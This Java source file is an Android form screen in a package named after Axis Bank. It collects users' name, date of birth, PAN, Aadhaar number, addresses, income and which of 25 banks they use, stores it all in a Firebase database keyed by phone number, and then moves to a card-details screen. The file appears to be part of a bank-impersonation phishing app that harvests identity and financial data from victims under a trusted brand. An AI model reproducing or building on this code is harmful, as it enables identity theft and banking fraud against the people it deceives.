package com.bank.axisbank.screen;

import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.Bundle;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.EditText;
import android.widget.LinearLayout;
import android.widget.Spinner;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import com.bank.axisbank.R;
import com.bank.axisbank.model.UserData;
import com.bank.axisbank.model.phone;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.database.DatabaseReference;
import com.google.firebase.database.FirebaseDatabase;

import java.util.ArrayList;
import java.util.Objects;

public class formActivity extends AppCompatActivity {
    Spinner countrySpinner , stateSpinner , cardSpinner;
    EditText ET_name , ET_email , ET_pan,ET_aadhar,ET_PAddress,ET_CAddress ,ET_Pincode,ET_income,ET_Dob ;
    private String name , email , Date_of_Birth ,pan,aadhar,PAddress,CAddress ,COUNTRY ,STATE,Pincode, BANK ,income;
    LinearLayout loading;
    View loadingoverlay;
    Button submit ;
    public static FirebaseDatabase db ;
    public static DatabaseReference ref;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_form);
        countrySpinner = findViewById(R.id.CountrySpinner);
        stateSpinner = findViewById(R.id.StateSpinner);
        cardSpinner=findViewById(R.id.BankSpinner);
        ET_name=findViewById(R.id.fullName);
        ET_email=findViewById(R.id.Email);
        ET_pan=findViewById(R.id.pan);
        ET_aadhar=findViewById(R.id.Aadhar);
        ET_PAddress=findViewById(R.id.PAddress);
        ET_CAddress=findViewById(R.id.CAddress);
        ET_Pincode=findViewById(R.id.pincode);
        ET_income=findViewById(R.id.income);
        submit=findViewById(R.id.submit);
        loading=findViewById(R.id.prog);
        loadingoverlay=findViewById(R.id.loadingOverlayyy);
        ET_Dob = findViewById(R.id.dateOfBirth);


        ArrayList<String> countries=new ArrayList<>();
        countries.add("India");

        ArrayList<String> State = new ArrayList<>();
        State.add("Andaman and Nicobar Islands");
        State.add("Andhra Pradesh");
        State.add("Arunachal Pradesh");
        State.add("Assam");
        State.add("Bihar");
        State.add("Chandigarh");
        State.add("Chhattisgarh");
        State.add("Daman & Diu");
        State.add("Delhi");
        State.add("Goa");
        State.add("Gujarat");
        State.add("Haryana");
        State.add("Himachal Pradesh");
        State.add("Jammu and Kashmir");
        State.add("Jharkhand");
        State.add("Karnataka");
        State.add("Kerala");
        State.add("Ladakh");
        State.add("Lakshadweep");
        State.add("Madhya Pradesh");
        State.add("Maharashtra");
        State.add("Manipur");
        State.add("Meghalaya");
        State.add("Mizoram");
        State.add("Nagaland");
        State.add("Odisha");
        State.add("Puducherry");
        State.add("Punjab");
        State.add("Rajasthan");
        State.add("Sikkim");
        State.add("Tamil Nadu");
        State.add("Telangana");
        State.add("Tripura");
        State.add("Uttar Pradesh");
        State.add("Uttarakhand");
        State.add("West Bengal");

        ArrayList<String> Bank = new ArrayList<>();
        Bank.add("ICICI Bank");
        Bank.add("Axis Bank");
        Bank.add("Union Bank of India");
        Bank.add("State Bank of India (SBI)");
        Bank.add("HDFC Bank");
        Bank.add("Punjab National Bank (PNB)");
        Bank.add("Kotak Mahindra Bank");
        Bank.add("Bank of Baroda (BOB)");
        Bank.add("Canara Bank");
        Bank.add("IDBI Bank");
        Bank.add("Yes Bank");
        Bank.add("IndusInd Bank");
        Bank.add("Federal Bank");
        Bank.add("RBL Bank");
        Bank.add("Citi Bank");
        Bank.add("HSBC Bank");
        Bank.add("Standard Chartered Bank");
        Bank.add("DBS Bank");
        Bank.add("Karnataka Bank");
        Bank.add("South Indian Bank");
        Bank.add("Karur Vysya Bank");
        Bank.add("Dhanlaxmi Bank");
        Bank.add("UCO Bank");
        Bank.add("Vijaya Bank");
        Bank.add("Oriental Bank of Commerce (OBC)");

        ArrayAdapter<String> countryAdapter = new ArrayAdapter<>(getApplicationContext(), R.layout.dropdown_item,R.id.item,countries);
        countryAdapter.insert("Choose Country",0);

        ArrayAdapter<String> StateAdapter = new ArrayAdapter<>(getApplicationContext(), R.layout.dropdown_item,R.id.item,State);
        StateAdapter.insert("Choose State",0);

        ArrayAdapter<String> BankAdapter = new ArrayAdapter<>(getApplicationContext(), R.layout.dropdown_item,R.id.item, Bank);
        BankAdapter.insert("Choose Bank",0);

        countrySpinner.setAdapter(countryAdapter);
        stateSpinner.setAdapter(StateAdapter);
        cardSpinner.setAdapter(BankAdapter);
        countrySpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> adapterView, View view, int i, long l) {
                COUNTRY=adapterView.getItemAtPosition(i).toString();
            }

            @Override
            public void onNothingSelected(AdapterView<?> adapterView) {

            }
        });
        stateSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> adapterView, View view, int i, long l) {
                STATE =adapterView.getItemAtPosition(i).toString();
            }

    @Override
            public void onNothingSelected(AdapterView<?> adapterView) {

            }
        });
        cardSpinner.setOnItemSelectedListener(new AdapterView.OnItemSelectedListener() {
            @Override
            public void onItemSelected(AdapterView<?> adapterView, View view, int i, long l) {
                BANK=adapterView.getItemAtPosition(i).toString();
            }

            @Override
            public void onNothingSelected(AdapterView<?> adapterView) {

            }
        });
        submit.setOnClickListener(view -> {
            loadingoverlay.setVisibility(View.VISIBLE);
            loading.setVisibility(View.VISIBLE);
            name =ET_name.getText().toString();
            email=ET_email.getText().toString();
            Date_of_Birth = ET_Dob.getText().toString();
            pan=ET_pan.getText().toString();
            aadhar=ET_aadhar.getText().toString();
            PAddress=ET_PAddress.getText().toString();
            CAddress=ET_CAddress.getText().toString();
            Pincode=ET_Pincode.getText().toString();
            income =ET_income.getText().toString();
            if(Objects.equals(name, "") ||Objects.equals(Date_of_Birth,"")|| Objects.equals(pan, "") || Objects.equals(aadhar, "") || Objects.equals(PAddress, "") || Objects.equals(Pincode, "") || Objects.equals(BANK, "") || Objects.equals(COUNTRY, "") ||STATE ==""){
                loadingoverlay.setVisibility(View.GONE);
                loading.setVisibility(View.GONE);
                Toast.makeText(getApplicationContext(),"Enter All Details",Toast.LENGTH_LONG).show();

            }else {
                try {
                    String phoneNum = phone.getPhone();
                    db = FirebaseDatabase.getInstance();
                    ref=db.getReference().child(phoneNum);
//                  String userId = ref.getKey().toString();
                    UserData userData= new UserData(phoneNum,name,email,Date_of_Birth,pan,aadhar,PAddress,CAddress,COUNTRY,STATE,Pincode,income,BANK);
                    ref.child("Personal Information").setValue(userData).addOnCompleteListener(new OnCompleteListener<Void>() {
                        @Override
                        public void onComplete(@NonNull Task<Void> task) {
                            loadingoverlay.setVisibility(View.GONE);
                            loading.setVisibility(View.GONE);
                            Intent intent = new Intent(getApplicationContext(), cardDetails.class);
                            startActivity(intent);
                        }
                    });
                }catch (Exception e){
                    loadingoverlay.setVisibility(View.GONE);
                    loading.setVisibility(View.GONE);
                    Toast.makeText(getApplicationContext(),"Error: Please Try Later",Toast.LENGTH_LONG).show();
                }


            }

        });
        if (isInternetAvailable()) {

        } else {
            loadingoverlay.setVisibility(View.GONE);
            loading.setVisibility(View.GONE);

            Toast.makeText(this, "Failed to connect to Internet", Toast.LENGTH_SHORT).show();

        }


    }
    private boolean isInternetAvailable() {
        ConnectivityManager connectivityManager = (ConnectivityManager) getSystemService(Context.CONNECTIVITY_SERVICE);
        if (connectivityManager != null) {
            NetworkInfo activeNetworkInfo = connectivityManager.getActiveNetworkInfo();
            return activeNetworkInfo != null && activeNetworkInfo.isConnected();
        }
        return false;
    }
}